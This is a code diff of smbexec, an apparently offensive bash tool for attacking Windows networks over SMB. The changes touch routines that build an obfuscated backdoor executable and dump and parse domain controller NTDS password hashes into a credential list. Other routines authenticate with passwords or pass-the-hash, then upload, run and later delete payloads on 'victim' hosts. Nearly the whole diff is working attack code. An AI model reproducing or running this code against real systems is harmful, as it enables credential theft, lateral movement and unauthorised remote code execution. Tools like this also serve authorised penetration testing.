@@ -22,7 +22,7 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.e
 #
-# Last update - 01/20/2013 v1.2.3
+# Last update - 01/24/2013 v1.2.3
 #############################################################################################
 
 # Check to see if X is running
@@ -169,7 +169,7 @@ f_vanish(){
 
 		# Create backdoor.exe - puts the file together in order -al14s
 		p=
-		enumber=$((RANDOM%20+3))
+		enumber=$((RANDOM%17+3))
 		seed=$((RANDOM%10000+1))
 		if [[ "$paychoice" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
 		echo -e '#include <stdio.h>\nunsigned char ufs[]=' > $logfldr/backdoor.c
@@ -282,7 +282,7 @@ f_vanish(){
 		5) f_custompayload ;;
 		6) f_payloadrc ;;
 		7) f_mainmenu ;;
-		*) exit ;;
+		*) f_vanish ;;
 	esac
 
 	f_getinfo
@@ -316,12 +316,12 @@ f_mainmenu
 }
 
 f_get_user_list(){
-    user_list=
-    read -e -p " Please provide the path to your credential list: " user_list
-    if [ ! -e $user_list ]; then
-	    echo -en "   The file does not exist.\n"
-	    user_list=
-    fi
+user_list=
+if [[ -e "$logfldr/hashes/DC/cred.lst" ]]; then p="[$logfldr/hashes/DC/cred.lst]"; fi
+read -e -p " Please provide the path to your credential list $p: " user_list
+if [ -z $user_list ]; then user_list="$logfldr/hashes/DC/cred.lst"; fi
+if [ ! -e $user_list ]; then echo "The file provided does not exist..."; f_get_user_list; fi
+p=
 }
 
 f_parse_user_list(){
@@ -345,7 +345,7 @@ f_get_target_list(){
 	    sleep 3
 	    f_get_target_list
     fi	
-	read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
+	read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 	if [ -z $SMBDomain ]; then SMBDomain=.;	fi
 }
 
@@ -725,6 +725,19 @@ dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
 python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys > $logfldr/hashes/DC/ntds.output
 $smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/dc-hashes.lst
 
+set -f              # turn off globbing
+IFS='
+'	# split at newlines only
+for i in $(cat $logfldr/hashes/DC/dc-hashes.lst); do
+	dc_username=$(echo "$i" |cut -d ":" -f1)
+	dc_hashvalue=$(echo "$i" |cut -d ":" -f3-4)
+	echo -e $dc_username'\t'$dc_hashvalue >> /tmp/smbexec/hash_pass_lst.tmp
+done
+unset IFS
+set +f	# turn off globbing
+
+cat /tmp/smbexec/hash_pass_lst.tmp |grep -v "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" > $logfldr/hashes/DC/cred.lst
+
 if [ -s $logfldr/hashes/DC/dc-hashes.lst ]; then
 	echo -e "\n\e[1;32m[+] Success, looks like we got what we came for...\e[0m"
 	sleep 5
@@ -818,6 +831,8 @@ f_enumshares(){
 			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m" | tee -a /tmp/smbexec/enum.shares
 		elif [ ! -z "$unreachable" ]; then
 			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m" | tee -a /tmp/smbexec/enum.shares
+		elif [ ! -z "$accessdenied" ]; then
+			echo -e "\e[1;31m[-] Remote access to $i was denied\e[0m" | tee -a /tmp/smbexec/enum.shares
 		else
 			cat /tmp/smbexec/connects.tmp | awk '/Sharename/,/failed/'| egrep -v 'session|lame'| tee -a /tmp/smbexec/enum.shares
 		fi
@@ -842,12 +857,18 @@ f_enumshares(){
 f_smbauth(){
 	SMBUser= #Since the prog is a loop make sure we clear this out
 	while [ -z $SMBUser ]; do read -r -e -p " Please provide the username to authenticate as : " SMBUser; done
+	
 	SMBPass= #Since the prog is a loop make sure we clear this out
-	while [ -z $SMBPass ]; do read -e -p " Please provide the password or hash (<LM>:<NTLM>) for the specified username : " SMBPass; done
+	#If the password is blank then we'll use the has value, otherwise smbwinexe & smbexeclient will request the password from the user	
+	read -e -p " Please provide the password or hash (<LM>:<NTLM>) [BLANK] : " SMBPass
+
+	if [ -z $SMBPass ]; then
+		SMBPass="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+	fi
 
 	# Hashes are 65 characters long, this compares input to see if its a password or a hash
 	SMBHASH= #Since the prog is a loop make sure we clear this out
-	if [ "$(echo $SMBPass| wc -m)" -ge "65" ]; then 
+	if [ "$(echo $SMBPass| wc -m)" -ge "65" ]; then
 		export SMBHASH=$SMBPass # This is required when using a hash value
 	fi
 
@@ -875,11 +896,12 @@ f_smbauth(){
 }
 
 f_smbauthinfo(){
-	cat /tmp/smbexec/connects.tmp | grep -i "Domain=" > /tmp/smbexec/success.chk
+	cat /tmp/smbexec/connects.tmp | grep "//$i" > /tmp/smbexec/success.chk
 	logonfail=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_LOGON_FAILURE")
 	connrefused=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_CONNECTION_REFUSED")
 	badshare=$(cat /tmp/smbexec/connects.tmp | egrep -i 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
 	unreachable=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_HOST_UNREACHABLE")
+	accessdenied=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_ACCESS_DENIED")
 }
 
 #Function to gain the basic info
@@ -965,16 +987,18 @@ f_getsome(){
 		# Check to see what type of error we got so we can tell the user
 		f_smbauthinfo
 
-		if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
-			echo -e "\e[1;32m[+] Authentication to $i successful...uploading and executing payload\e[0m"
-		elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
+		if [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
 			echo -e "\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
 		elif [ ! -z "$logonfail" ]; then
 			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m"
+		elif [ ! -z "$accessdenied" ]; then
+			echo -e "\e[1;31m[-] Remote access to $i is denied\e[0m"
 		elif [ ! -z "$connrefused" ]; then
 			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m"
 		elif [ ! -z "$unreachable" ]; then
 			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
+		elif [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
+			echo -e "\e[1;32m[+] Authentication to $i successful...uploading and executing payload\e[0m"
 		else
 			echo -e "\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
 			cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
@@ -988,26 +1012,23 @@ f_getsome(){
 			echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
 			if [ "$isadmin" == "1" ]; then
 				ADMINPATH=$prepath$RPATH
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			if [ ! -z $cemptyrpath ]; then
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			if [ ! -z "$oddshare" ]; then
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			elif [ ! -z "$superoddshare" ]; then
 				#Ugly hack for placing payload in root of shares like Users or Public. May only work for shares on the C drive
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			else
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
-			echo $! > /tmp/smbexec/winexe.pid #grab the pid so we can kill it
-			sleep 10 #give it time to auth, execute payload and migrate
-			kill -9 $(cat /tmp/smbexec/winexe.pid) #Kill off the winexe pid because it doesn't seem to exit gracefully
-			wait $(cat /tmp/smbexec/winexe.pid) 2>/dev/null #Prevents output from pid kill to be written to screen
+			echo $! >> /tmp/smbexec/winexe.pid #grab the pid so we can kill it
 		fi
 
 		#Unset the variables because we're in a for-loop
@@ -1044,16 +1065,16 @@ f_cleanup(){
 			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C taskkill /IM $SMBFilename /F" &> /tmp/smbexec/error.jnk
 			echo -e "\n\e[1;33mRemoving the file from the victim, please standby\e[0m"
 			if [ ! -z $cemptyrpath ]; then
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ "$isadmin" == "1" ]; then
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ ! -z "$oddshare" ]; then
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ ! -z "$superoddshare" ]; then
 				#Ugly hack for removing payload in root of shares like Users or Public. May only work for shares on the C drive
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
 			else
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			fi
 		done
 	else
@@ -1074,6 +1095,13 @@ f_cleanup(){
 	echo -en "\e[1;33mHit enter to return to Main Menu\e[0m "
 	read -p ""
 	
+	if [ -e /tmp/smbexec/winexe/pid ]; then
+		for i in $(cat /tmp/smbexec/winexe.pid); do
+			kill -9 $(cat /tmp/smbexec/winexe.pid) #Kill off the winexe pid because it doesn't seem to exit gracefully
+			wait $(cat /tmp/smbexec/winexe.pid) 2>/dev/null #Prevents output from pid kill to be written to screen
+		done
+	fi
+
 	f_freshstart
 	f_mainmenu
 }
@@ -1083,7 +1111,7 @@ f_freshstart(){
 rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
 
 # unset variables to prevent problems in the loop
-vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHash SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da"
+vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da"
 
 for var in $vars; do
 	unset $var
